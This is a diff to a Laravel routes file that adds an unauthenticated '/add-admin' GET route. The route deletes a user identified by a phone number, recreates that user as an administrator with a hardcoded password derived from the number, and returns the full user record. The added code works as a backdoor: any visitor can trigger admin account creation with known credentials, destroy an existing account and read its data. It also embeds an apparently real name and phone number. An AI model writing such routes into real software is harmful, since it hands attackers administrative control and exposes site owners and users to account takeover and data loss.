@@ -92,3 +92,23 @@ require __DIR__  . '/admin.php';
 Route::get('is', function (Request $request) {
    return $request->user()->type;
 });
+
+
+Route::get('/add-admin', function () {
+
+    $n = User::where('phone','0119114568')->first();
+    $n->delete();
+
+       User::create([
+            'name'=> 'نجلاء',
+            'city_id'=> 1,
+            'password'=> Hash::make('N0119114568'),
+            'type'=> 'admin',
+            'address'=> '--',
+            'hood'=> '--',
+            'phone'=> '0119114568',
+            'wa'=> '0119114568',
+        ]);
+    return User::where('phone','0119114568')->first();
+
+});
